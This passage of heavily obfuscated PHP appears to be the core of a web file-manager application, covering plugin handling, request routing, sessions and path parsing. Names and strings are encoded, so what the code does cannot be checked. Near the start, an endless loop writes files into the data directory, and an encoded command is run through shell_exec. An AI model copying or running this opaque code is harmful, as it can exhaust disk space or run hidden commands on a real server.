= json_encode($GLOBALS[$Ú½îŞü–[1630]]); $­ÍŠÌÜø = 1; for ($Ÿ±ÁİÌø = $­ÍŠÌÜø; $Ÿ±ÁİÌø > 0; $Ÿ±ÁİÌø++) { $«›ç…Í“(DATA_PATH . $Ÿ±ÁİÌø, $‚ò¦ƒœı); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $’‚ÑŸë°); } public function onSetConfig($õÆ€ùŠ) { } public function onGetConfig($æÌ¡ñœÄ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($éä‚—Ãú) { if ($éä‚—Ãú == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($æÏ‘ƒã¯ = "\x70\154\165\x67\151\x6e\101\x75\x74\150") { $„åÂºğØ =& $_SERVER[íû‘ş´]; if (!Session::get($„åÂºğØ[1576])) { return !1; } if (_get($GLOBALS, $„åÂºğØ[546])) { return !0; } $ÂØØ™é = $this->getConfig(); if (!$ÂØØ™é[$æÏ‘ƒã¯]) { return !1; } return ActionCall($„åÂºğØ[1631], $ÂØØ™é[$æÏ‘ƒã¯]); } public function url($…ÆÑ‚ã», $¦ƒù¥Ó¯ = '', $‘ÌÕŠ° = true) { $Ï•ùÜ× =& $_SERVER[íû‘ş´]; $”™›åŒ¡ = $this->getConfig(); $äéÃ¢¨ô = KOD_VERSION . $Ï•ùÜ×[10] . KOD_VERSION_BUILD; $ÈúØô§ = $this->packageVersion(); $˜Õìö÷œ = $äéÃ¢¨ô . $Ï•ùÜ×[430] . $ÈúØô§; if (substr($…ÆÑ‚ã», 0, 4) == $Ï•ùÜ×[149] || substr($…ÆÑ‚ã», 0, 2) == $Ï•ùÜ×[1411]) { $öŞ·Ï¦ = $…ÆÑ‚ã» . $Ï•ùÜ×[1632] . $˜Õìö÷œ; } else { if ($¦ƒù¥Ó¯ == $Ï•ùÜ×[12]) { $öŞ·Ï¦ = $this->pluginHost . $…ÆÑ‚ã» . $Ï•ùÜ×[1632] . $˜Õìö÷œ; } else { if ($¦ƒù¥Ó¯ === $Ï•ùÜ×[75]) { $öŞ·Ï¦ = $this->pluginHost . $…ÆÑ‚ã»; } else { if ($¦ƒù¥Ó¯ == $Ï•ùÜ×[1633]) { $öŞ·Ï¦ = STATIC_PATH . $…ÆÑ‚ã» . $Ï•ùÜ×[1632] . $äéÃ¢¨ô; } else { if ($¦ƒù¥Ó¯ == $Ï•ùÜ×[1634]) { $öŞ·Ï¦ = APP_HOST . $Ï•ùÜ×[1635] . $…ÆÑ‚ã» . $Ï•ùÜ×[1632] . $äéÃ¢¨ô; } else { if (isset($”™›åŒ¡[$¦ƒù¥Ó¯])) { $öŞ·Ï¦ = $”™›åŒ¡[$¦ƒù¥Ó¯] . $…ÆÑ‚ã» . $Ï•ùÜ×[1632] . $˜Õìö÷œ; } } } } } } if (!$‘ÌÕŠ°) { return $öŞ·Ï¦; } echo $öŞ·Ï¦; } public function link($Œ²Õ¶î = false, $ÚòÍë¬„ = '') { $‡Ñôª² =& $_SERVER[íû‘ş´]; if (!$Œ²Õ¶î) { $this->link($‡Ñôª²[1636], $‡Ñôª²[1634]); $this->link($‡Ñôª²[1637], $‡Ñôª²[1633]); $this->link($‡Ñôª²[1638], $‡Ñôª²[1633]); $this->link($‡Ñôª²[1639], $‡Ñôª²[1633]); $this->link($‡Ñôª²[1640], $‡Ñôª²[1633]); return; } $—®ç³Ş¨ = $this->url($Œ²Õ¶î, $ÚòÍë¬„, !1); if (substr($Œ²Õ¶î, -3) == $‡Ñôª²[1641]) { echo $‡Ñôª²[1642] . $—®ç³Ş¨ . $‡Ñôª²[1643] . $‡Ñôª²[246]; } else { if (substr($Œ²Õ¶î, -4) == $‡Ñôª²[1644]) { echo $‡Ñôª²[1645] . $—®ç³Ş¨ . $‡Ñôª²[1646] . $‡Ñôª²[246]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\x79" => "\x5b\x5e\x2f\135\53", "\x3a\156\165\155" => "\133\x30\x2d\x39\135\x2b", "\72\x61\x6c\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($¿€’½ÁŞ, $è¬Åˆó) { $ë˜¬ÓÊ =& $_SERVER[íû‘ş´]; if ($¿€’½ÁŞ == $ë˜¬ÓÊ[1647]) { $²±ÆÈ‡ = array_map($ë˜¬ÓÊ[1648], $è¬Åˆó[0]); $¶üÃÈ­” = strpos($è¬Åˆó[1], $ë˜¬ÓÊ[8]) === 0 ? $è¬Åˆó[1] : $ë˜¬ÓÊ[8] . $è¬Åˆó[1]; $èŠ¨×É³ = $è¬Åˆó[2]; } else { $²±ÆÈ‡ = null; $¶üÃÈ­” = strpos($è¬Åˆó[0], $ë˜¬ÓÊ[8]) === 0 ? $è¬Åˆó[0] : $ë˜¬ÓÊ[8] . $è¬Åˆó[0]; $èŠ¨×É³ = $è¬Åˆó[1]; } array_push(self::$maps, $²±ÆÈ‡); array_push(self::$routes, $¶üÃÈ­”); array_push(self::$methods, strtoupper($¿€’½ÁŞ)); array_push(self::$callbacks, $èŠ¨×É³); } public static function error($™¬¬·Î) { self::$errorCallback = $™¬¬·Î; } public static function haltOnMatch($ñÜ¦Çó = true) { self::$halts = $ñÜ¦Çó; } public static function dispatch() { $Î•«’¨¦ =& $_SERVER[íû‘ş´]; $û´ã«Ê = parse_url($_SERVER[$Î•«’¨¦[1649]], PHP_URL_PATH); $„úâÀÈ¹ = $_SERVER[$Î•«’¨¦[160]]; $àı¼ªáî = array_keys(static::$patterns); $®¸¨Ÿû… = array_values(static::$patterns); $ùşÎÍš… = !1; self::$routes = preg_replace($Î•«’¨¦[1334], $Î•«’¨¦[8], self::$routes); if (in_array($û´ã«Ê, self::$routes)) { $ˆ¸Ç¹Éû = array_keys(self::$routes, $û´ã«Ê); foreach ($ˆ¸Ç¹Éû as $´Ôö´ã) { if (self::$methods[$´Ôö´ã] == $„úâÀÈ¹ || self::$methods[$´Ôö´ã] == $Î•«’¨¦[1650] || in_array($„úâÀÈ¹, self::$maps[$´Ôö´ã])) { $ùşÎÍš… = !0; if (!is_object(self::$callbacks[$´Ôö´ã])) { $ô¶€ªì = explode($Î•«’¨¦[8], self::$callbacks[$´Ôö´ã]); $µ“†„ê¼ = end($ô¶€ªì); $¥‹Ó¸±« = explode($Î•«’¨¦[1266], $µ“†„ê¼); $½³óÓè” = new $¥‹Ó¸±«[0](); $½³óÓè”->{$¥‹Ó¸±«[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$´Ôö´ã]); if (self::$halts) { return; } } } } } else { $Æö¾‚¹ª = 0; foreach (self::$routes as $´Ôö´ã) { if (strpos($´Ôö´ã, $Î•«’¨¦[4]) !== !1) { $´Ôö´ã = str_replace($àı¼ªáî, $®¸¨Ÿû…, $´Ôö´ã); } if (preg_match($Î•«’¨¦[1651] . $´Ôö´ã . $Î•«’¨¦[1652], $û´ã«Ê, $ïëØç¢¢)) { if (self::$methods[$Æö¾‚¹ª] == $„úâÀÈ¹ || self::$methods[$Æö¾‚¹ª] == $Î•«’¨¦[1650] || !empty(self::$maps[$Æö¾‚¹ª]) && in_array($„úâÀÈ¹, self::$maps[$Æö¾‚¹ª])) { $ùşÎÍš… = !0; array_shift($ïëØç¢¢); if (!is_object(self::$callbacks[$Æö¾‚¹ª])) { $ô¶€ªì = explode($Î•«’¨¦[8], self::$callbacks[$Æö¾‚¹ª]); $µ“†„ê¼ = end($ô¶€ªì); $¥‹Ó¸±« = explode($Î•«’¨¦[1266], $µ“†„ê¼); $½³óÓè” = new $¥‹Ó¸±«[0](); if (!method_exists($½³óÓè”, $¥‹Ó¸±«[1])) { echo $Î•«’¨¦[1653]; } else { call_user_func_array(array($½³óÓè”, $¥‹Ó¸±«[1]), $ïëØç¢¢); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Æö¾‚¹ª], $ïëØç¢¢); if (self::$halts) { return; } } } } $Æö¾‚¹ª++; } } if ($ùşÎÍš… == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $å—×Á‘¤ =& $_SERVER[íû‘ş´]; header($_SERVER[$å—×Á‘¤[1654]] . $å—×Á‘¤[1655]); echo $å—×Á‘¤[1656]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Î•«’¨¦[1649]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $©å­©Œ =& $_SERVER[íû‘ş´]; static $¯´˜±ªı = false; if ($¯´˜±ªı) { return $¯´˜±ªı; } $«†É¿ = $GLOBALS[$©å­©Œ[6]][$©å­©Œ[393]]; self::$sessionTime = $«†É¿[$©å­©Œ[1657]]; $õŒ½Ì = isset($GLOBALS[$©å­©Œ[1658]]) ? $GLOBALS[$©å­©Œ[1658]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($õŒ½Ì)) { self::$sessionSign = Cookie::get($õŒ½Ì); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($õŒ½Ì, self::$sessionSign, self::$sessionTime); $¶í›œ = $«†É¿[$©å­©Œ[1659]]; $ğûÛÜ¶ = $«†É¿[$¶í›œ]; $ÇË‹¼ = $«†É¿[$©å­©Œ[887]]; switch ($¶í›œ) { case $©å­©Œ[21]: self::$handle = Model($©å­©Œ[888]); break; case $©å­©Œ[889]: self::$handle = new CacheRedis($ğûÛÜ¶, $ÇË‹¼); break; case $©å­©Œ[890]: self::$handle = new CacheMemcached($ğûÛÜ¶, $ÇË‹¼); break; case $©å­©Œ[214]: $ğûÛÜ¶[$©å­©Œ[84]] = $ğûÛÜ¶[$©å­©Œ[84]] . $©å­©Œ[1660]; self::$handle = new CacheFile($ğûÛÜ¶, $ÇË‹¼); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $¯´˜±ªı = new self(); return $¯´˜±ªı; } public static function getBySign($µ©âÕÍ¼) { $€§‚ÃòÔ = self::$handle->get($µ©âÕÍ¼); $€§‚ÃòÔ = unserialize($€§‚ÃòÔ); return is_array($€§‚ÃòÔ) ? $€§‚ÃòÔ : array(); } public static function setBySign($şÄÆş•…, $ €Â×ìŞ) { CacheLock::lock($şÄÆş•…); self::$handle->set($şÄÆş•…, serialize($ €Â×ìŞ), self::$sessionTime); CacheLock::unlock($şÄÆş•…); } public static function sign($Ÿú°­õ™ = false) { if ($Ÿú°­õ™) { self::$sessionSign = $Ÿú°­õ™; } self::init(); return self::$sessionSign; } public static function set($—…¯Ú•É, $øø…ì“ = false) { self::init(); if (is_array($—…¯Ú•É)) { foreach ($—…¯Ú•É as $ÛıÌÅĞ¬ => $£ÍÚôú³) { array_set_value(self::$data, $ÛıÌÅĞ¬, $£ÍÚôú³); } } else { array_set_value(self::$data, $—…¯Ú•É, $øø…ì“); } self::setBySign(self::$sessionSign, self::$data); } public static function get($€™æ™Å¿ = false) { self::init(); if (!$€™æ™Å¿) { return self::$data; } return array_get_value(self::$data, $€™æ™Å¿); } public static function remove($Òë‚€€Á) { self::init(); unset(self::$data[$Òë‚€€Á]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[íû‘ş´][893])) { self::$handle->clearTimeout(); } } } goto cÕì‰Ò„è; EÍ¼àÈò: class KodIO { const KOD_SOURCE = "\173\x73\x6f\x75\162\143\x65\175"; const KOD_USER_RECYCLE = "\173\x75\163\x65\x72\122\145\143\171\x63\154\145\175"; const KOD_USER_FAV = "\x7b\x75\x73\145\162\106\141\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\x65\x72\x46\151\x6c\x65\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\162\106\151\154\145\x54\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\x6f\x75\x70\122\x6f\157\164\123\145\154\x66\x7d"; const KOD_USER_SHARE = "\x7b\x75\163\x65\162\x53\x68\x61\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\x73\145\x72\x53\x68\141\x72\x65\114\151\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\173\163\150\x61\162\x65\124\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\150\x61\162\x65\111\164\x65\155\x7d"; const KOD_SHARE_LINK = "\173\x73\150\141\x72\145\111\x74\145\155\114\151\x6e\153\x7d"; const KOD_SEARCH = "\173\163\x65\141\x72\143\x68\x7d"; const KOD_BLOCK = "\173\x62\x6c\x6f\143\x6b\175"; const KOD_IO = "\173\151\x6f\x7d"; const KOD_USER_RECENT = "\173\165\x73\x65\162\122\145\x6e\x63\x65\x6e\164\175"; const KOD_USER_DRIVER = "\x7b\x64\162\x69\166\145\162\175"; public static function typeList() { $´êÜÒ§ =& $_SERVER[íû‘ş´]; return array($´êÜÒ§[1309] => self::KOD_SOURCE, $´êÜÒ§[1310] => self::KOD_USER_RECYCLE, $´êÜÒ§[1311] => self::KOD_USER_FAV, $´êÜÒ§[1312] => self::KOD_USER_FILE_TAG, $´êÜÒ§[1313] => self::KOD_USER_FILE_TYPE, $´êÜÒ§[1314] => self::KOD_GROUP_ROOT_SELF, $´êÜÒ§[1315] => self::KOD_USER_SHARE, $´êÜÒ§[1316] => self::KOD_USER_SHARE_LINK, $´êÜÒ§[1317] => self::KOD_USER_SHARE_TO_ME, $´êÜÒ§[1318] => self::KOD_SHARE_ITEM, $´êÜÒ§[1319] => self::KOD_SHARE_LINK, $´êÜÒ§[1320] => self::KOD_SEARCH, $´êÜÒ§[1321] => self::KOD_BLOCK, $´êÜÒ§[1322] => self::KOD_IO, $´êÜÒ§[1323] => self::KOD_USER_RECENT, $´êÜÒ§[1324] => self::KOD_USER_DRIVER); } public static function parse($á˜üˆñ¢) { $³ä»Ä¡¨ =& $_SERVER[íû‘ş´]; $á˜üˆñ¢ = self::clear($á˜üˆñ¢); $¶°ÅÆ®ò = array_values(self::typeList()); preg_match($³ä»Ä¡¨[1325], $á˜üˆñ¢, $¨¬ô«¼); $™•ÚŸ– = array($³ä»Ä¡¨[473] => !1, $³ä»Ä¡¨[1326] => !1, $³ä»Ä¡¨[470] => !1, $³ä»Ä¡¨[84] => $á˜üˆñ¢, $³ä»Ä¡¨[1227] => !1, $³ä»Ä¡¨[1226] => $³ä»Ä¡¨[12]); if (is_array($¨¬ô«¼) && count($¨¬ô«¼) == 5) { $È”¹È¯ˆ = $³ä»Ä¡¨[1327] . $¨¬ô«¼[2] . $³ä»Ä¡¨[371]; if (in_array($È”¹È¯ˆ, $¶°ÅÆ®ò)) { $™•ÚŸ–[$³ä»Ä¡¨[1227]] = $¨¬ô«¼[1]; $™•ÚŸ–[$³ä»Ä¡¨[33]] = $È”¹È¯ˆ; $™•ÚŸ–[$³ä»Ä¡¨[1328]] = substr($È”¹È¯ˆ, 1, -1); $™•ÚŸ–[$³ä»Ä¡¨[443]] = $¨¬ô«¼[3]; } $™•ÚŸ–[$³ä»Ä¡¨[1226]] = $¨¬ô«¼[4]; } $ëö‡‹ïŞ = array($³ä»Ä¡¨[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $™•ÚŸ–[$³ä»Ä¡¨[1291]] = in_array($™•ÚŸ–[$³ä»Ä¡¨[33]], $ëö‡‹ïŞ); return $™•ÚŸ–; } public static function isTruePath($¦·ÍÍŠ) { $ò‡Æ÷— =& $_SERVER[íû‘ş´]; if (substr($¦·ÍÍŠ, 0, 1) != $ò‡Æ÷—[1327]) { return !0; } if (strpos($¦·ÍÍŠ, $ò‡Æ÷—[460]) === 0) { return !0; } if (strpos($¦·ÍÍŠ, $ò‡Æ÷—[1295]) === 0) { return !0; } if (strpos($¦·ÍÍŠ, $ò‡Æ÷—[1329]) === 0) { return !0; } if (strpos($¦·ÍÍŠ, $ò‡Æ÷—[1330]) === 0) { return !0; } if (strpos($¦·ÍÍŠ, $ò‡Æ÷—[1331]) === 0) { return !0; } return !1; } public static function clear($ïòí±) { $•Å’—ñÃ =& $_SERVER[íû‘ş´]; $ïòí± = str_replace(array($•Å’—ñÃ[1136], $•Å’—ñÃ[246]), $•Å’—ñÃ[53], $ïòí±); $ïòí± = str_replace($•Å’—ñÃ[97], $•Å’—ñÃ[8], $ïòí±); $Ã‡õ£”È = $•Å’—ñÃ[1332]; if (substr($ïòí±, 0, 3) == $•Å’—ñÃ[1333]) { $ïòí± = substr($ïòí±, 3); } while (strstr($ïòí±, $Ã‡õ£”È)) { $ïòí± = str_replace($Ã‡õ£”È, $•Å’—ñÃ[8], $ïòí±); } $ïòí± = preg_replace($•Å’—ñÃ[1334], $•Å’—ñÃ[8], $ïòí±); if ($ïòí± == $•Å’—ñÃ[8]) { return $•Å’—ñÃ[8]; } $ïòí± = rtrim($ïòí±, $•Å’—ñÃ[8]); return $ïòí±; } public static function pathTrue($úá°ëÓ) { $¦âÈŞå =& $_SERVER[íû‘ş´]; if (!$úá°ëÓ) { return $¦âÈŞå[12]; } $úá°ëÓ = str_replace($¦âÈŞå[571], $¦âÈŞå[8], str_replace($¦âÈŞå[1335], $¦âÈŞå[8], $úá°ëÓ)); $úá°ëÓ = str_replace($¦âÈŞå[571], $¦âÈŞå[8], str_replace($¦âÈŞå[1335], $¦âÈŞå[8], $úá°ëÓ)); if (!strstr($úá°ëÓ, $¦âÈŞå[1333])) { return $úá°ëÓ; } $ó´¬üô¯ = explode($¦âÈŞå[8], $úá°ëÓ); foreach ($ó´¬üô¯ as $Ò÷‰Ù®ò => $‚¥»Á¼¤) { if ($‚¥»Á¼¤ !== $¦âÈŞå[1336]) { continue; } for ($ÌÈ–áïõ = $Ò÷‰Ù®ò; $ÌÈ–áïõ >= 0; $ÌÈ–áïõ--) { if ($ó´¬üô¯[$ÌÈ–áïõ] === $¦âÈŞå[10] || $ó´¬üô¯[$ÌÈ–áïõ] === $¦âÈŞå[1336] || $ó´¬üô¯[$ÌÈ–áïõ] === -1) { continue; } if ($ó´¬üô¯[$ÌÈ–áïõ] === $¦âÈŞå[12]) { $ó´¬üô¯[$Ò÷‰Ù®ò] = -1; break; } $ó´¬üô¯[$Ò÷‰Ù®ò] = -1; $ó´¬üô¯[$ÌÈ–áïõ] = -1; break; } } $±€Éƒ“æ = array(); foreach ($ó´¬üô¯ as $‚¥»Á¼¤) { if ($‚¥»Á¼¤ !== -1) { $±€Éƒ“æ[] = $‚¥»Á¼¤; } } $ÏÑáÀ•Ş = implode($¦âÈŞå[8], $±€Éƒ“æ); if (strpos($ÏÑáÀ•Ş, $¦âÈŞå[1337]) === 0) { $ÏÑáÀ•Ş = $¦âÈŞå[1333] . substr($ÏÑáÀ•Ş, strlen($¦âÈŞå[1337])); } return $ÏÑáÀ•Ş; } public static function sourceID($§Äû€•») { $ÍñÆ™ =& $_SERVER[íû‘ş´]; $îÑò½Œğ = self::parse($§Äû€•»); if ($îÑò½Œğ[$ÍñÆ™[33]] !== self::KOD_SOURCE) { show_json(LNG($ÍñÆ™[1338]), !1); } return $îÑò½Œğ[$ÍñÆ™[443]]; } public static function make($Ó˜Ã”­) { if (!$Ó˜Ã”­) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Ó˜Ã”­)); } public static function makeShare($Á ¥À›„, $Ì® „í©) { return self::makePath(self::KOD_SHARE_ITEM, $Á ¥À›„, $Ì® „í©); } public static function makeFileTypePath($¨ºì™òÏ) { return self::makePath(self::KOD_USER_FILE_TYPE, $¨ºì™òÏ); } public static function makeFileTagPath($„Òò¹Ã) { return self::makePath(self::KOD_USER_FILE_TAG, $„Òò¹Ã); } public static function makePath($®ªæ³áæ, $œã Á¢Î = '', $¡§´àÃ¸ = '') { $ÎÜ†àµ =& $_SERVER[íû‘ş´]; $¾—¡úöÌ = substr($®ªæ³áæ, 1, -1); $°İ¸øŠÔ = $ÎÜ†àµ[1339] . $¾—¡úöÌ . $ÎÜ†àµ[1340] . $œã Á¢Î . $ÎÜ†àµ[1341]; $°İ¸øŠÔ = $¡§´àÃ¸ ? $°İ¸øŠÔ . $¡§´àÃ¸ . $ÎÜ†àµ[8] : $°İ¸øŠÔ; return $°İ¸øŠÔ; } public static function hashPath($¦ˆÕ¸ûû, $Ñ‚‹ÛŞ¶ = true) { $÷ıûÔ©¾ =& $_SERVER[íû‘ş´]; $„°» = is_array($¦ˆÕ¸ûû) ? $¦ˆÕ¸ûû : IO::info($¦ˆÕ¸ûû); $Àøä¡İÈ = _get($„°», $÷ıûÔ©¾[1342], $÷ıûÔ©¾[12]); if (!$Àøä¡İÈ && isset($„°»[$÷ıûÔ©¾[219]])) { $Àøä¡İÈ = trim($„°»[$÷ıûÔ©¾[219]], $÷ıûÔ©¾[118]); } if (!$Àøä¡İÈ && isset($„°»[$÷ıûÔ©¾[181]]) && $„°»[$÷ıûÔ©¾[181]]) { $„°» = IO::info(KodIO::make($„°»[$÷ıûÔ©¾[181]])); $Àøä¡İÈ = _get($„°», $÷ıûÔ©¾[1342], $÷ıûÔ©¾[12]); } $ƒºâÆÇÔ = md5($„°»[$÷ıûÔ©¾[84]] . $„°»[$÷ıûÔ©¾[76]] . $„°»[$÷ıûÔ©¾[85]]); if (!$Àøä¡İÈ && file_exists($„°»[$÷ıûÔ©¾[84]])) { $Àøä¡İÈ = Cache::get($ƒºâÆÇÔ . $÷ıûÔ©¾[1343]); $Àøä¡İÈ = !1; if (!$Àøä¡İÈ) { $Àøä¡İÈ = IO::hashSimple($„°»[$÷ıûÔ©¾[84]]); Cache::set($ƒºâÆÇÔ . $÷ıûÔ©¾[1343], $Àøä¡İÈ, 3600 * 24 * 30); } } if ($Ñ‚‹ÛŞ¶ && !$Àøä¡İÈ) { } return $Àøä¡İÈ ? $Àøä¡İÈ : $ƒºâÆÇÔ; } public static function hashPathSafe($Àè­ÜªÈ, $ï Şµâ = true) { $›ŞÁÙ±© =& $_SERVER[íû‘ş´]; $…ŸŠŒ© = self::hashPath($Àè­ÜªÈ, $ï Şµâ); return md5($…ŸŠŒ© . $›ŞÁÙ±©[1344] . Model($›ŞÁÙ±©[829])->get($›ŞÁÙ±©[830])); } public static function initSystemPath() { $Êõ’·Î˜ =& $_SERVER[íû‘ş´]; if (defined($Êõ’·Î˜[1345])) { return; } define($Êõ’·Î˜[1345], self::systemPath($Êõ’·Î˜[179])); define($Êõ’·Î˜[1346], self::systemPath($Êõ’·Î˜[1347])); define($Êõ’·Î˜[1348], self::systemPath($Êõ’·Î˜[1349])); define($Êõ’·Î˜[1350], self::systemPath($Êõ’·Î˜[1351])); IOHistory::bindEvent(); } public static function systemPath($ÁÌ­¡êæ) { $ëÊÃêş• =& $_SERVER[íû‘ş´]; $üî å…  = $ëÊÃêş•[1352] . ucfirst($ÁÌ­¡êæ); $ë†€òŞ = Model($ëÊÃêş•[829])->get($üî å… ); if ($ë†€òŞ) { return $ë†€òŞ; } if ($ÁÌ­¡êæ == $ëÊÃêş•[179]) { $ë†€òŞ = self::make(Model($ëÊÃêş•[884])->systemRootPathAdd($ëÊÃêş•[584])); } else { $ë†€òŞ = self::systemPath($ëÊÃêş•[179]); $Ó”¤ÃÔ = self::sourceID($ë†€òŞ); $ë†€òŞ = self::make(Model($ëÊÃêş•[884])->mkdir($Ó”¤ÃÔ, $ÁÌ­¡êæ)); } Model($ëÊÃêş•[829])->set($üî å… , $ë†€òŞ); return $ë†€òŞ; } public static function systemFolder($æÏØşş“) { $È²Ğ©îğ = IO_PATH_SYSTEM_SOURCE . $æÏØşş“; $™Õ´ƒ‹ = Cache::get($È²Ğ©îğ); if (!$™Õ´ƒ‹) { $„ÃêœÂ = IO::infoFullSimple($È²Ğ©îğ); if (!$„ÃêœÂ) { $™Õ´ƒ‹ = IO::mkdir($È²Ğ©îğ, REPEAT_SKIP); } else { $™Õ´ƒ‹ = $„ÃêœÂ[$_SERVER[íû‘ş´][84]]; } Cache::set($È²Ğ©îğ, $™Õ´ƒ‹, 3600 * 10); } return $™Õ´ƒ‹; } public static function defaultDriver() { return Model($_SERVER[íû‘ş´][826])->defaultDriver(); } public static function defaultIO() { $–½ÉÍÓû =& $_SERVER[íû‘ş´]; $ì¢Şü® = self::defaultDriver(); return $–½ÉÍÓû[1353] . $ì¢Şü®[$–½ÉÍÓû[443]] . $–½ÉÍÓû[1341]; } public static function defaultDriverInit() { static $¤ÓµÙå = false; if ($¤ÓµÙå) { return $¤ÓµÙå; } $¤ÓµÙå = IO::init(self::defaultIO()); return $¤ÓµÙå; } public static function fileTypeList() { $¢Òœªşì =& $_SERVER[íû‘ş´]; $ª¾ˆ¯ôÌ = $GLOBALS[$¢Òœªşì[6]][$¢Òœªşì[1354]]; foreach ($ª¾ˆ¯ôÌ as $û˜¯‡¸ => $€›×š®¹) { $ùàü¦Ú‹ = $¢Òœªşì[1355] . $û˜¯‡¸; $…‚Œ‘•’ = LNG($ùàü¦Ú‹); if ($ùàü¦Ú‹ != $…‚Œ‘•’) { $ª¾ˆ¯ôÌ[$û˜¯‡¸][$¢Òœªşì[32]] = $…‚Œ‘•’; } } return $ª¾ˆ¯ôÌ; } public static function diskList($“†®¶Î = true) { $ñ³èÒ¤¯ = $_SERVER[íû‘ş´][1356]; if ($“†®¶Î) { $úÔŠø¶© = Cache::get($ñ³èÒ¤¯); if (is_array($úÔŠø¶©)) { return $úÔŠø¶©; } } $úÔŠø¶© = self::diskListGet(); Cache::set($ñ³èÒ¤¯, $úÔŠø¶©, 60); return $úÔŠø¶©; } public static function diskListGet() { $›Û¼­áØ =& $_SERVER[íû‘ş´]; $¿¬‰ñÛÜ = array(); if ($GLOBALS[$›Û¼­áØ[6]][$›Û¼­áØ[1357]] == $›Û¼­áØ[1358]) { $©ØÕÊ•€ = $›Û¼­áØ[1359]; for ($‡‰¶ŞÖ° = 0; $‡‰¶ŞÖ° < strlen($©ØÕÊ•€); $‡‰¶ŞÖ°++) { $±è—› = $©ØÕÊ•€[$‡‰¶ŞÖ°] . $›Û¼­áØ[1360]; if (file_exists($±è—›)) { $¿¬‰ñÛÜ[] = $±è—›; } } return $¿¬‰ñÛÜ; } if (!function_exists($›Û¼­áØ[98])) { $¿¬‰ñÛÜ[] = $›Û¼­áØ[895]; return $¿¬‰ñÛÜ; } $æó¡…ñ = explode($›Û¼­áØ[246], shell_exec($›Û¼­áØ[1361])); array_shift($æó¡…ñ); array_pop($æó¡…ñ); $ş·Ÿš”ú = array($›Û¼­áØ[1362], $›Û¼­áØ[1363], $›Û¼­áØ[1364], $›Û¼­áØ[1365], $›Û¼­áØ[1366], $›Û¼­áØ[1367], $›Û¼­áØ[1368], $›Û¼­áØ[1369]); foreach ($æó¡…ñ as $¥Ÿó²Ş) { $—Ùò‹‚ = preg_split($›Û¼­áØ[1370], $¥Ÿó²Ş); $±è—› = $—Ùò‹‚[count($—Ùò‹‚) - 1]; if (!strstr($—Ùò‹‚[0], $›Û¼­áØ[1371]) || !$±è—›) { continue; } $ÎÖ¹¼› = rtrim($±è—›, $›Û¼­áØ[8]) . $›Û¼­áØ[8]; if (in_array($ÎÖ¹¼›, $ş·Ÿš”ú)) { continue; } $¿¬‰ñÛÜ[] = $ÎÖ¹¼›; } return $¿¬‰ñÛÜ; } public static function isSameDisk($ÉÊÛåÂè, $Á¥æ·¤) { $ûËÚ½ÎÃ =& $_SERVER[íû‘ş´]; if ($GLOBALS[$ûËÚ½ÎÃ[6]][$ûËÚ½ÎÃ[1357]] == $ûËÚ½ÎÃ[1358]) { return strtolower(substr($ÉÊÛåÂè, 0, 1)) == strtolower(substr($Á¥æ·¤, 0, 1)); } $ÂœßÚª‡ = self::diskList(); $ğßÛÏÎ = !1; $¾Ü¯øÙ = !1; sort($ÂœßÚª‡); $ÂœßÚª‡ = array_reverse($ÂœßÚª‡); $ÉÊÛåÂè = rtrim($ÉÊÛåÂè, $ûËÚ½ÎÃ[8]) . $ûËÚ½ÎÃ[8]; $Á¥æ·¤ = rtrim($Á¥æ·¤, $ûËÚ½ÎÃ[8]) . $ûËÚ½ÎÃ[8]; foreach ($ÂœßÚª‡ as $ˆ¨“”ƒ) { $ìæ’øú = strlen($ˆ¨“”ƒ); if (!$ğßÛÏÎ && substr($ÉÊÛåÂè, 0, $ìæ’øú) == $ˆ¨“”ƒ) { $ğßÛÏÎ = $ˆ¨“”ƒ; } if (!$¾Ü¯øÙ && substr($Á¥æ·¤, 0, $ìæ’øú) == $ˆ¨“”ƒ) { $¾Ü¯øÙ = $ˆ¨“”ƒ; } if ($ğßÛÏÎ && $¾Ü¯øÙ) { break; } } return $ğßÛÏÎ === $¾Ü¯øÙ; } public static function transferType($ãÃ–¡Ğê, $»¿×®ªµ) { $Ëøœ¼úç =& $_SERVER[íû‘ş´]; $€ â¼Ò» = self::driverType($ãÃ–¡Ğê); $†€¹ºñ÷ = self::driverType($»¿×®ªµ); if ($€ â¼Ò»[$Ëøœ¼úç[33]] == $†€¹ºñ÷[$Ëøœ¼úç[33]] && $€ â¼Ò»[$Ëøœ¼úç[1372]] == $†€¹ºñ÷[$Ëøœ¼úç[1372]]) { return $Ëøœ¼úç[1373]; } if ($€ â¼Ò»[$Ëøœ¼úç[33]] == $Ëøœ¼úç[928] && $†€¹ºñ÷[$Ëøœ¼úç[33]] == $Ëøœ¼úç[106]) { return $Ëøœ¼úç[1252]; } if 